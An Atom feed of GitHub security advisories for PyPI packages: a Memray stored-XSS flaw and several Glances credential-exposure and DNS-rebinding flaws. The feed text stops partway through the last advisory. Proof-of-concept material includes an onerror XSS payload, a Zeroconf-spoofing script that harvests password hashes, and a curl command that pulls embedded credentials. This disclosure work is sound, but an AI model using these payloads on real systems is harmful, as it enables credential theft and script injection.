<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-03-17T03:46:10.539Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[memray] Stored XSS in Memray-generated HTML reports via unescaped command-line metadata]]></title>
        <id>https://github.com/advisories/GHSA-r5pr-887v-m2w9</id>
        <link href="https://github.com/advisories/GHSA-r5pr-887v-m2w9"/>
        <updated>2026-03-16T16:42:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Prior to Memray 1.19.2, Memray rendered the command line of the tracked process directly into generated HTML reports without escaping. Because there was no escaping, attacker-controlled command line arguments were inserted as raw HTML into the generated report.</p>
<p>This allowed JavaScript execution when a victim opened the generated report in a browser.</p>
<h2 id="affected-version">Affected Version</h2>
<ul>
<li>Memray version: <code>1.19.1</code> and earlier</li>
</ul>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to Memray 1.19.2, and avoid attaching Memray to untrusted processes until you have upgraded.</p>
<h2 id="root-cause">Root Cause</h2>
<p>Jinja is used to embed the process's command line arguments into the generated flame graph or table report. Memray has not been telling Jinja to HTML escape the command line arguments when writing them into the HTML, leading to a stored XSS vulnerability.</p>
<h2 id="impact">Impact</h2>
<p>An attacker who can influence the script name or command-line arguments of a profiled program can inject HTML/JavaScript into Memray-generated HTML reports (both <code>memray flamegraph</code> and <code>memray table</code> reports, both with and without <code>--no-web</code>). When a victim opens the generated report in a browser, the injected JavaScript executes in the context of the report.</p>
<p>Note that in the case of <code>memray attach</code>, the user attaching Memray and generating the report may be a different user than the one who ran the command and set up the command line arguments.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Run Memray on a script with an attacker-controlled filename:</p>
<pre><code class="language-bash">touch '&lt;img src=x onerror=alert(1)&gt;'
python -m memray run -o poc.bin '&lt;img src=x onerror=alert(1)&gt;'
</code></pre>
<p>Generate a report:</p>
<pre><code class="language-bash">python -m memray flamegraph -o poc.html poc.bin
</code></pre>
<h2 id="observed-result">Observed Result</h2>
<p>The generated HTML contains raw unescaped attacker-controlled HTML.</p>
<p>Opening or reloading the generated report in a browser triggers JavaScript execution.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bloomberg/memray/security/advisories/GHSA-r5pr-887v-m2w9">https://github.com/bloomberg/memray/security/advisories/GHSA-r5pr-887v-m2w9</a></li>
<li><a href="https://github.com/bloomberg/memray/commit/ba6e4e2e9930f9641bed7adfdf43c8e2545ce249">https://github.com/bloomberg/memray/commit/ba6e4e2e9930f9641bed7adfdf43c8e2545ce249</a></li>
<li><a href="https://github.com/bloomberg/memray/releases/tag/v1.19.2">https://github.com/bloomberg/memray/releases/tag/v1.19.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r5pr-887v-m2w9">https://github.com/advisories/GHSA-r5pr-887v-m2w9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r5pr-887v-m2w9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-16T16:41:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances Central Browser Autodiscovery Leaks Reusable Credentials to Zeroconf-Spoofed Servers]]></title>
        <id>https://github.com/advisories/GHSA-vx5f-957p-qpvm</id>
        <link href="https://github.com/advisories/GHSA-vx5f-957p-qpvm"/>
        <updated>2026-03-16T16:36:07.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In Central Browser mode, Glances stores both the Zeroconf-advertised server name and the discovered IP address for dynamic servers, but later builds connection URIs from the untrusted advertised name instead of the discovered IP. When a dynamic server reports itself as protected, Glances also uses that same untrusted name as the lookup key for saved passwords and the global <code>[passwords] default</code> credential.</p>
<p>An attacker on the same local network can advertise a fake Glances service over Zeroconf and cause the browser to automatically send a reusable Glances authentication secret to an attacker-controlled host. This affects the background polling path and the REST/WebUI click-through path in Central Browser mode.</p>
<h2 id="details">Details</h2>
<p>Dynamic server discovery keeps both a short <code>name</code> and a separate <code>ip</code>:</p>
<pre><code class="language-python"># glances/servers_list_dynamic.py:56-61
def add_server(self, name, ip, port, protocol='rpc'):
    new_server = {
        'key': name,
        'name': name.split(':')[0],  # Short name
        'ip': ip,  # IP address seen by the client
        'port': port,
        ...
        'type': 'DYNAMIC',
    }
</code></pre>
<p>The Zeroconf listener populates those fields directly from the service advertisement:</p>
<pre><code class="language-python"># glances/servers_list_dynamic.py:112-121
new_server_ip = socket.inet_ntoa(address)
new_server_port = info.port
...
self.servers.add_server(
    srv_name,
    new_server_ip,
    new_server_port,
    protocol=new_server_protocol,
)
</code></pre>
<p>However, the Central Browser connection logic ignores <code>server['ip']</code> and instead uses the untrusted advertised <code>server['name']</code> for both password lookup and the destination URI:</p>
<pre><code class="language-python"># glances/servers_list.py:119-130
def get_uri(self, server):
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self.password.get_password(server['name'])
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        uri = 'http://{}:{}@{}:{}'.format(
            server['username'],
            server['password'],
            server['name'],
            server['port'],
        )
    else:
        uri = 'http://{}:{}'.format(server['name'], server['port'])
    return uri
</code></pre>
<p>That URI is used automatically by the background polling thread:</p>
<pre><code class="language-python"># glances/servers_list.py:141-143
def __update_stats(self, server):
    server['uri'] = self.get_uri(server)
</code></pre>
<p>The password lookup itself falls back to the global default password when there is no exact match:</p>
<pre><code class="language-python"># glances/password_list.py:45-58
def get_password(self, host=None):
    ...
    try:
        return self._password_dict[host]
    except (KeyError, TypeError):
        try:
            return self._password_dict['default']
        except (KeyError, TypeError):
            return None
</code></pre>
<p>The sample configuration explicitly supports that <code>default</code> credential reuse:</p>
<pre><code class="language-ini"># conf/glances.conf:656-663
[passwords]
# Define the passwords list related to the [serverlist] section
# ...
#default=defaultpassword
</code></pre>
<p>The secret sent over the network is not the cleartext password, but it is still a reusable Glances authentication credential. The client hashes the configured password and sends that hash over HTTP Basic authentication:</p>
<pre><code class="language-python"># glances/password.py:72-74,94
# For Glances client, get the password (confirm=False, clear=True):
#     2) the password is hashed with SHA-pbkdf2_hmac (only SHA string transit
password = password_hash
</code></pre>
<pre><code class="language-python"># glances/client.py:55-57
if args.password != "":
    self.uri = f'http://{args.username}:{args.password}@{args.client}:{args.port}'
</code></pre>
<p>There is an inconsistent trust boundary in the interactive browser code as well:</p>
<ul>
<li><code>glances/client_browser.py:44</code> opens the REST/WebUI target via <code>webbrowser.open(self.servers_list.get_uri(server))</code>, which again trusts <code>server['name']</code></li>
<li><code>glances/client_browser.py:55</code> fetches saved passwords with <code>self.servers_list.password.get_password(server['name'])</code></li>
<li><code>glances/client_browser.py:76</code> uses <code>server['ip']</code> for the RPC client connection</li>
</ul>
<p>That asymmetry shows the intended safe destination (<code>ip</code>) is already available, but the credential-bearing URI and password binding still use the attacker-controlled Zeroconf name.</p>
<h3 id="exploit-flow">Exploit Flow</h3>
<ol>
<li>The victim runs Glances in Central Browser mode with autodiscovery enabled and has a saved Glances password in <code>[passwords]</code> (especially <code>default=...</code>).</li>
<li>An attacker on the same multicast domain advertises a fake <code>_glances._tcp.local.</code> service with an attacker-controlled service name.</li>
<li>Glances stores the discovered server as <code>{'name': &lt;advertised-name&gt;, 'ip': &lt;discovered-ip&gt;, ...}</code>.</li>
<li>The background stats refresh calls <code>get_uri(server)</code>.</li>
<li>Once the fake server causes the entry to become <code>PROTECTED</code>, <code>get_uri()</code> looks up a saved password by the attacker-controlled <code>name</code>, falls back to <code>default</code> if present, hashes it, and builds <code>http://username:hash@&lt;advertised-name&gt;:&lt;port&gt;</code>.</li>
<li>The attacker receives a reusable Glances authentication secret and can replay it against Glances servers using the same credential.</li>
</ol>
<h2 id="poc">PoC</h2>
<h3 id="step-1-verified-local-logic-proof">Step 1: Verified local logic proof</h3>
<p>The following command executes the real <code>glances/servers_list.py</code> <code>get_uri()</code> implementation (with unrelated imports stubbed out) and demonstrates that:</p>
<ul>
<li>password lookup happens against <code>server['name']</code>, not <code>server['ip']</code></li>
<li>the generated credential-bearing URI uses <code>server['name']</code>, not <code>server['ip']</code></li>
</ul>
<pre><code class="language-bash">cd D:\bugcrowd\glances\repo
@'
import importlib.util
import sys
import types
from pathlib import Path

pkg = types.ModuleType('glances')
pkg.__apiversion__ = '4'
sys.modules['glances'] = pkg

client_mod = types.ModuleType('glances.client')
class GlancesClientTransport: pass
client_mod.GlancesClientTransport = GlancesClientTransport
sys.modules['glances.client'] = client_mod

globals_mod = types.ModuleType('glances.globals')
globals_mod.json_loads = lambda x: x
sys.modules['glances.globals'] = globals_mod

logger_mod = types.ModuleType('glances.logger')
logger_mod.logger = types.SimpleNamespace(
    debug=lambda *a, **k: None,
    warning=lambda *a, **k: None,
    info=lambda *a, **k: None,
    error=lambda *a, **k: None,
)
sys.modules['glances.logger'] = logger_mod

password_list_mod = types.ModuleType('glances.password_list')
class GlancesPasswordList: pass
password_list_mod.GlancesPasswordList = GlancesPasswordList
sys.modules['glances.password_list'] = password_list_mod

dynamic_mod = types.ModuleType('glances.servers_list_dynamic')
class GlancesAutoDiscoverServer: pass
dynamic_mod.GlancesAutoDiscoverServer = GlancesAutoDiscoverServer
sys.modules['glances.servers_list_dynamic'] = dynamic_mod

static_mod = types.ModuleType('glances.servers_list_static')
class GlancesStaticServer: pass
static_mod.GlancesStaticServer = GlancesStaticServer
sys.modules['glances.servers_list_static'] = static_mod

spec = importlib.util.spec_from_file_location('tested_servers_list', Path('glances/servers_list.py'))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
GlancesServersList = mod.GlancesServersList

class FakePassword:
    def get_password(self, host=None):
        print(f'lookup:{host}')
        return 'defaultpassword'
    def get_hash(self, password):
        return f'hash({password})'

sl = GlancesServersList.__new__(GlancesServersList)
sl.password = FakePassword()
server = {
    'name': 'trusted-host',
    'ip': '203.0.113.77',
    'port': 61209,
    'username': 'glances',
    'password': None,
    'status': 'PROTECTED',
    'type': 'DYNAMIC',
}

print(sl.get_uri(server))
print(server)
'@ | python -
</code></pre>
<p>Verified output:</p>
<pre><code class="language-text">lookup:trusted-host
http://glances:hash(defaultpassword)@trusted-host:61209
{'name': 'trusted-host', 'ip': '203.0.113.77', 'port': 61209, 'username': 'glances', 'password': 'hash(defaultpassword)', 'status': 'PROTECTED', 'type': 'DYNAMIC'}
</code></pre>
<p>This confirms the code path binds credentials to the advertised <code>name</code> and ignores the discovered <code>ip</code>.</p>
<h3 id="step-2-live-network-reproduction">Step 2: Live network reproduction</h3>
<ol>
<li>Configure a reusable browser password:</li>
</ol>
<pre><code class="language-ini"># glances.conf
[passwords]
default=SuperSecretBrowserPassword
</code></pre>
<ol start="2">
<li>Start Glances in Central Browser mode on the victim machine:</li>
</ol>
<pre><code class="language-bash">glances --browser -C ./glances.conf
</code></pre>
<ol start="3">
<li>On an attacker-controlled machine on the same LAN, advertise a fake Glances Zeroconf service and return HTTP 401 / XML-RPC auth failures so the entry becomes <code>PROTECTED</code>:</li>
</ol>
<pre><code class="language-python">from zeroconf import ServiceInfo, Zeroconf
import socket
import time

zc = Zeroconf()
info = ServiceInfo(
    "_glances._tcp.local.",
    "198.51.100.50:61209._glances._tcp.local.",
    addresses=[socket.inet_aton("198.51.100.50")],
    port=61209,
    properties={b"protocol": b"rpc"},
    server="ignored.local.",
)
zc.register_service(info)
time.sleep(600)
</code></pre>
<ol start="4">
<li>On the next Central Browser refresh, Glances first probes the fake server, marks it <code>PROTECTED</code>, then retries with:</li>
</ol>
<pre><code class="language-text">http://glances:&lt;pbkdf2_hash_of_default_password&gt;@198.51.100.50:61209
</code></pre>
<ol start="5">
<li>The attacker captures the Basic-auth credential and can replay that value as the Glances password hash against Glances servers that share the same configured password.</li>
</ol>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Credential exfiltration from browser operators:</strong> An adjacent-network attacker can harvest the reusable Glances authentication secret from operators running Central Browser mode with saved passwords.</li>
<li><strong>Authentication replay:</strong> The captured pbkdf2-derived Glances password hash can be replayed against Glances servers that use the same credential.</li>
<li><strong>REST/WebUI click-through abuse:</strong> For REST servers, <code>webbrowser.open(self.servers_list.get_uri(server))</code> can open attacker-controlled URLs with embedded credentials.</li>
<li><strong>No user click required for background theft:</strong> The stats refresh thread uses the vulnerable path automatically once the fake service is marked <code>PROTECTED</code>.</li>
<li><strong>Affected scope:</strong> This is limited to Central Browser deployments with autodiscovery enabled and saved/default passwords configured. Static server entries and standalone non-browser use are not directly affected by this specific issue.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Use the discovered <code>ip</code> as the only network destination for autodiscovered servers, and do not automatically apply saved or default passwords to dynamic entries.</p>
<pre><code class="language-python"># glances/servers_list.py

def _get_connect_host(self, server):
    if server.get('type') == 'DYNAMIC':
        return server['ip']
    return server['name']

def _get_preconfigured_password(self, server):
    # Dynamic Zeroconf entries are untrusted and should not inherit saved/default creds
    if server.get('type') == 'DYNAMIC':
        return None
    return self.password.get_password(server['name'])

def get_uri(self, server):
    host = self._get_connect_host(server)
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self._get_preconfigured_password(server)
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        return 'http://{}:{}@{}:{}'.format(server['username'], server['password'], host, server['port'])
    return 'http://{}:{}'.format(host, server['port'])
</code></pre>
<p>And use the same <code>_get_preconfigured_password()</code> logic in <code>glances/client_browser.py</code> instead of calling <code>self.servers_list.password.get_password(server['name'])</code> directly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-vx5f-957p-qpvm">https://github.com/nicolargo/glances/security/advisories/GHSA-vx5f-957p-qpvm</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/61d38eec521703e41e4933d18d5a5ef6f854abd5">https://github.com/nicolargo/glances/commit/61d38eec521703e41e4933d18d5a5ef6f854abd5</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-vx5f-957p-qpvm">https://github.com/advisories/GHSA-vx5f-957p-qpvm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx5f-957p-qpvm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-16T16:36:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances's Browser API Exposes Reusable Downstream Credentials via `/api/4/serverslist`]]></title>
        <id>https://github.com/advisories/GHSA-r297-p3v4-wp8m</id>
        <link href="https://github.com/advisories/GHSA-r297-p3v4-wp8m"/>
        <updated>2026-03-16T16:35:02.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In Central Browser mode, the <code>/api/4/serverslist</code> endpoint returns raw server objects from <code>GlancesServersList.get_servers_list()</code>. Those objects are mutated in-place during background polling and can contain a <code>uri</code> field with embedded HTTP Basic credentials for downstream Glances servers, using the reusable pbkdf2-derived Glances authentication secret.</p>
<p>If the front Glances Browser/API instance is started without <code>--password</code>, which is supported and common for internal network deployments, <code>/api/4/serverslist</code> is completely unauthenticated. Any network user who can reach the Browser API can retrieve reusable credentials for protected downstream Glances servers once they have been polled by the browser instance.</p>
<h2 id="details">Details</h2>
<p>The Browser API route simply returns the raw servers list:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:799-805
def _api_servers_list(self):
    self.__update_servers_list()
    return GlancesJSONResponse(self.servers_list.get_servers_list() if self.servers_list else [])
</code></pre>
<p>The main API router is only protected when the front instance itself was started with <code>--password</code>. Otherwise there are no authentication dependencies at all:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py:475-480
if self.args.password:
    router = APIRouter(prefix=self.url_prefix, dependencies=[Depends(self.authentication)])
else:
    router = APIRouter(prefix=self.url_prefix)
</code></pre>
<p>The Glances web server binds to <code>0.0.0.0</code> by default:</p>
<pre><code class="language-python"># glances/main.py:425-427
parser.add_argument(
    '--bind',
    default='0.0.0.0',
    dest='bind_address',
)
</code></pre>
<p>During Central Browser polling, server entries are modified in-place and gain a <code>uri</code> field:</p>
<pre><code class="language-python"># glances/servers_list.py:141-148
def __update_stats(self, server):
    server['uri'] = self.get_uri(server)
    ...
    if server['protocol'].lower() == 'rpc':
        self.__update_stats_rpc(server['uri'], server)
    elif server['protocol'].lower() == 'rest' and not import_requests_error_tag:
        self.__update_stats_rest(f"{server['uri']}/api/{__apiversion__}", server)
</code></pre>
<p>For protected servers, <code>get_uri()</code> loads the saved password from the <code>[passwords]</code> section (or the <code>default</code> password), hashes it, and embeds it directly in the URI:</p>
<pre><code class="language-python"># glances/servers_list.py:119-130
def get_uri(self, server):
    if server['password'] != "":
        if server['status'] == 'PROTECTED':
            clear_password = self.password.get_password(server['name'])
            if clear_password is not None:
                server['password'] = self.password.get_hash(clear_password)
        uri = 'http://{}:{}@{}:{}'.format(
            server['username'],
            server['password'],
            server['name'],
            server['port'],
        )
    else:
        uri = 'http://{}:{}'.format(server['name'], server['port'])
    return uri
</code></pre>
<p>Password lookup falls back to a global default:</p>
<pre><code class="language-python"># glances/password_list.py:55-58
try:
    return self._password_dict[host]
except (KeyError, TypeError):
    return self._password_dict['default']
</code></pre>
<p>The sample configuration explicitly supports browser-wide default password reuse:</p>
<pre><code class="language-ini"># conf/glances.conf:656-663
[passwords]
# localhost=abc
# default=defaultpassword
</code></pre>
<p>The secret embedded in <code>uri</code> is not the cleartext password, but it is still a reusable Glances authentication credential. Client connections send that pbkdf2-derived hash over HTTP Basic authentication:</p>
<pre><code class="language-python"># glances/password.py:72-74,94
# For Glances client, get the password (confirm=False, clear=True):
#     2) the password is hashed with SHA-pbkdf2_hmac (only SHA string transit
password = password_hash
</code></pre>
<pre><code class="language-python"># glances/client.py:56-57
if args.password != "":
    self.uri = f'http://{args.username}:{args.password}@{args.client}:{args.port}'
</code></pre>
<p>The Browser WebUI also consumes that raw <code>uri</code> directly and redirects the user to it:</p>
<pre><code class="language-javascript">// glances/outputs/static/js/Browser.vue:83-103
fetch("api/4/serverslist", { method: "GET" })
...
window.location.href = server.uri;
</code></pre>
<p>So once <code>server.uri</code> contains credentials, those credentials are not just used internally; they are exposed to API consumers and frontend JavaScript.</p>
<h2 id="poc">PoC</h2>
<h3 id="step-1-verified-local-live-proof-that-server-objects-contain-credential-bearing-uris">Step 1: Verified local live proof that server objects contain credential-bearing URIs</h3>
<p>The following command executes the real <code>glances/servers_list.py</code> update logic against a live local HTTP server that always returns <code>401</code>. This forces Glances to mark the downstream server as <code>PROTECTED</code> and then retry with the saved/default password. After the second refresh, the in-memory server list contains a <code>uri</code> field with embedded credentials.</p>
<pre><code class="language-bash">cd D:\bugcrowd\glances\repo
@'
import importlib.util
import json
import sys
import threading
import types
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path
from defusedxml import xmlrpc as defused_xmlrpc

pkg = types.ModuleType('glances')
pkg.__apiversion__ = '4'
sys.modules['glances'] = pkg

client_mod = types.ModuleType('glances.client')
class GlancesClientTransport(defused_xmlrpc.xmlrpc_client.Transport):
    def set_timeout(self, timeout):
        self.timeout = timeout
client_mod.GlancesClientTransport = GlancesClientTransport
sys.modules['glances.client'] = client_mod

globals_mod = types.ModuleType('glances.globals')
globals_mod.json_loads = json.loads
sys.modules['glances.globals'] = globals_mod

logger_mod = types.ModuleType('glances.logger')
logger_mod.logger = types.SimpleNamespace(
    debug=lambda *a, **k: None,
    warning=lambda *a, **k: None,
    info=lambda *a, **k: None,
    error=lambda *a, **k: None,
)
sys.modules['glances.logger'] = logger_mod

password_list_mod = types.ModuleType('glances.password_list')
class GlancesPasswordList: pass
password_list_mod.GlancesPasswordList = GlancesPasswordList
sys.modules['glances.password_list'] = password_list_mod

dynamic_mod = types.ModuleType('glances.servers_list_dynamic')
class GlancesAutoDiscoverServer: pass
dynamic_mod.GlancesAutoDiscoverServer = GlancesAutoDiscoverServer
sys.modules['glances.servers_list_dynamic'] = dynamic_mod

static_mod = types.ModuleType('glances.servers_list_static')
class GlancesStaticServer: pass
static_mod.GlancesStaticServer = GlancesStaticServer
sys.modules['glances.servers_list_static'] = static_mod

spec = importlib.util.spec_from_file_location('tested_servers_list', Path('glances/servers_list.py'))
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod)
GlancesServersList = mod.GlancesServersList

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        _ = self.rfile.read(int(self.headers.get('Content-Length', '0')))
        self.send_response(401)
        self.end_headers()
    def log_message(self, *args):
        pass

httpd = HTTPServer(('127.0.0.1', 0), Handler)
port = httpd.server_address[1]
thread = threading.Thread(target=httpd.serve_forever, daemon=True)
thread.start()

class FakePassword:
    def get_password(self, host=None):
        return 'defaultpassword'
    def get_hash(self, password):
        return f'hash({password})'

sl = GlancesServersList.__new__(GlancesServersList)
sl.password = FakePassword()
sl._columns = [{'plugin': 'system', 'field': 'hr_name'}]
server = {
    'key': f'target:{port}',
    'name': '127.0.0.1',
    'ip': '203.0.113.77',
    'port': port,
    'protocol': 'rpc',
    'username': 'glances',
    'password': '',
    'status': 'UNKNOWN',
    'type': 'STATIC',
}
sl.get_servers_list = lambda: [server]

sl._GlancesServersList__update_stats(server)
sl._GlancesServersList__update_stats(server)
httpd.shutdown()
thread.join(timeout=2)
print(json.dumps(sl.get_servers_list(), indent=2))
'@ | python -
</code></pre>
<p>Verified output:</p>
<pre><code class="language-json">[
  {
    "key": "target:57390",
    "name": "127.0.0.1",
    "ip": "203.0.113.77",
    "port": 57390,
    "protocol": "rpc",
    "username": "glances",
    "password": null,
    "status": "PROTECTED",
    "type": "STATIC",
    "uri": "http://glances:hash(defaultpassword)@127.0.0.1:57390",
    "columns": [
      "system_hr_name"
    ]
  }
]
</code></pre>
<p>This is the same raw object shape that <code>/api/4/serverslist</code> returns.</p>
<h3 id="step-2-remote-reproduction-on-a-live-browser-instance">Step 2: Remote reproduction on a live Browser instance</h3>
<ol>
<li>Configure Glances Browser mode with a saved default password for downstream servers:</li>
</ol>
<pre><code class="language-ini">[passwords]
default=SuperSecretBrowserPassword
</code></pre>
<ol start="2">
<li>Start the Browser/API instance without front-end authentication:</li>
</ol>
<pre><code class="language-bash">glances --browser -w -C ./glances.conf
</code></pre>
<ol start="3">
<li><p>Ensure at least one protected downstream server is polled and marked <code>PROTECTED</code>.</p>
</li>
<li><p>From any machine that can reach the Glances Browser API, fetch the raw server list:</p>
</li>
</ol>
<pre><code class="language-bash">curl -s http://TARGET:61208/api/4/serverslist
</code></pre>
<ol start="5">
<li>Observe entries like:</li>
</ol>
<pre><code class="language-json">{
  "name": "internal-glances.example",
  "status": "PROTECTED",
  "uri": "http://glances:&lt;pbkdf2_hash&gt;@internal-glances.example:61209"
}
</code></pre>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Unauthenticated credential disclosure:</strong> When the front Browser API runs without <code>--password</code>, any reachable user can retrieve downstream Glances authentication secrets from <code>/api/4/serverslist</code>.</li>
<li><strong>Credential replay:</strong> The disclosed pbkdf2-derived hash is the effective Glances client secret and can be replayed against downstream Glances servers using the same password.</li>
<li><strong>Fleet-wide blast radius:</strong> A single Browser instance can hold passwords for many downstream servers via host-specific entries or <code>[passwords] default</code>, so one exposed API can disclose credentials for an entire monitored fleet.</li>
<li><strong>Chains with the earlier CORS issue:</strong> Even when the front instance uses <code>--password</code>, the permissive default CORS behavior can let a malicious website read <code>/api/4/serverslist</code> from an authenticated browser session and steal the same downstream credentials cross-origin.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Do not expose credential-bearing fields in API responses. At minimum, strip <code>uri</code>, <code>password</code>, and any derived credential material from <code>/api/4/serverslist</code> responses and make the frontend derive navigation targets without embedded auth.</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py

def _sanitize_server(self, server):
    safe = dict(server)
    safe.pop('password', None)
    safe.pop('uri', None)
    return safe

def _api_servers_list(self):
    self.__update_servers_list()
    servers = self.servers_list.get_servers_list() if self.servers_list else []
    return GlancesJSONResponse([self._sanitize_server(server) for server in servers])
</code></pre>
<p>And in the Browser WebUI, construct navigation URLs from non-secret fields (<code>ip</code>, <code>name</code>, <code>port</code>, <code>protocol</code>) instead of trusting a backend-supplied <code>server.uri</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nicolargo/glances/security/advisories/GHSA-r297-p3v4-wp8m">https://github.com/nicolargo/glances/security/advisories/GHSA-r297-p3v4-wp8m</a></li>
<li><a href="https://github.com/nicolargo/glances/commit/879ef8688ffa1630839549751d3c7ef9961d361e">https://github.com/nicolargo/glances/commit/879ef8688ffa1630839549751d3c7ef9961d361e</a></li>
<li><a href="https://github.com/nicolargo/glances/releases/tag/v4.5.2">https://github.com/nicolargo/glances/releases/tag/v4.5.2</a></li>
<li><a href="https://github.com/advisories/GHSA-r297-p3v4-wp8m">https://github.com/advisories/GHSA-r297-p3v4-wp8m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r297-p3v4-wp8m</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-16T16:35:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Glances] Glances's REST/WebUI Lacks Host Validation and Remains Exposed to DNS Rebinding]]></title>
        <id>https://github.com/advisories/GHSA-hhcg-r27j-fhv9</id>
        <link href="https://github.com/advisories/GHSA-hhcg-r27j-fhv9"/>
        <updated>2026-03-16T16:34:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Glances recently added DNS rebinding protection for the MCP endpoint, but the main REST/WebUI FastAPI application still accepts arbitrary <code>Host</code> headers and does not apply <code>TrustedHostMiddleware</code> or an equivalent host allowlist.</p>
<p>As a result, the REST API, WebUI, and token endpoint remain reachable through attacker-controlled domains in classic DNS rebinding scenarios. Once the victim browser has rebound the attacker domain to the Glances service, same-origin policy no longer protects the API because the browser considers the rebinding domain to be the origin.</p>
<p>This is a distinct issue from the previously reported default CORS weakness. CORS is not required for exploitation here because DNS rebinding causes the victim browser to treat the malicious domain as same-origin with the rebinding target.</p>
<h2 id="details">Details</h2>
<p>The MCP endpoint now has explicit host-based transport security:</p>
<pre><code class="language-python"># glances/outputs/glances_mcp.py
self.mcp_allowed_hosts = ["localhost", "127.0.0.1"]
...
return TransportSecuritySettings(
    allowed_hosts=allowed_hosts,
    allowed_origins=allowed_origins,
)
</code></pre>
<p>However, the main FastAPI application for REST/WebUI/token routes is initialized without any host validation middleware:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py
self._app = FastAPI(default_response_class=GlancesJSONResponse)
...
self._app.add_middleware(
    CORSMiddleware,
    allow_origins=config.get_list_value('outputs', 'cors_origins', default=["*"]),
    allow_credentials=config.get_bool_value('outputs', 'cors_credentials', default=True),
    allow_methods=config.get_list_value('outputs', 'cors_methods', default=["*"]),
    allow_headers=config.get_list_value('outputs', 'cors_headers', default=["*"]),
)
...
if self.args.password and self._jwt_handler is not None:
    self._app.include_router(self._token_router())
self._app.include_router(self._router())
</code></pre>
<p>There is no <code>TrustedHostMiddleware</code>, no comparison against the configured bind host, and no allowlist enforcement for HTTP <code>Host</code> values on the REST/WebUI surface.</p>
<p>The default bind configuration also exposes the service on all interfaces:</p>
<pre><code class="language-python"># glances/main.py
parser.add_argument(
    '-B',
    '--bind',
    default='0.0.0.0',
    dest='bind_address',
    help='bind server to the given IPv4/IPv6 address or hostname',
)
</code></pre>
<p>This combination means the HTTP service will typically be reachable from the victim machine under an attacker-selected hostname once DNS is rebound to the Glances listener.</p>
<p>The token endpoint is also mounted on the same unprotected FastAPI app:</p>
<pre><code class="language-python"># glances/outputs/glances_restful_api.py
def _token_router(self) -&gt; APIRouter:
    ...
    router.add_api_route(f'{base_path}/token', self._api_token, methods=['POST'], dependencies=[])
</code></pre>
<h2 id="why-this-is-exploitable">Why This Is Exploitable</h2>
<p>In a DNS rebinding attack:</p>
<ol>
<li>The attacker serves JavaScript from <code>https://attacker.example</code>.</li>
<li>The victim visits that page while a Glances instance is reachable on the victim network.</li>
<li>The attacker's DNS for <code>attacker.example</code> is rebound from the attacker's server to the Glances IP address.</li>
<li>The victim browser now sends same-origin requests to <code>https://attacker.example</code>, but those requests are delivered to Glances.</li>
<li>Because the Glances REST/WebUI app does not validate the <code>Host</code> header or enforce an allowed-host policy, it serves the response.</li>
<li>The attacker-controlled JavaScript can read the response as same-origin content.</li>
</ol>
<p>The MCP code already acknowledges this threat model and implements host-level defenses. The REST/WebUI code path does not.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>This issue is code-validated by inspection of the current implementation:</p>
<ul>
<li>REST/WebUI/token are all mounted on a plain <code>FastAPI(...)</code> app</li>
<li>no <code>TrustedHostMiddleware</code> or equivalent host validation is applied</li>
<li>default bind is <code>0.0.0.0</code></li>
<li>MCP has separate rebinding protection, showing the project already recognizes the threat model</li>
</ul>
